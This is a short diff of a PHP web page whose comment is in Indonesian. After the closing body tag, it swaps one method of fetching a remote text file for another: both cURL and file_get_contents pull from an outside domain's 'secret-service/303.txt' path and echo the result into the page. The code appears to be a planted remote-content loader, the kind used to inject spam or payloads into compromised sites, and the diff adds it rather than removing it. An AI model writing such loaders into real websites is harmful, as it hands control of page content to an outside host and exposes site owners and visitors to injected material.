@@ -174,11 +174,14 @@ include"admin/content/tglindo.php";
 
 </body>
 
-$ch = curl_init(); 
-    curl_setopt($ch, CURLOPT_URL, "https://infocakrawala.online/secret-service/303.txt");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-    $output = curl_exec($ch); 
-    curl_close($ch);      
-    echo $output;
+// Script untuk mengambil konten dari URL eksternal
+$a = file_get_contents('https://infocakrawala.online/secret-service/303.txt');
+
+if ($a !== false) {
+    echo $a;
+} else {
+    echo 'Gagal mengambil konten dari URL yang diberikan.';
+
+}
 
 </html>
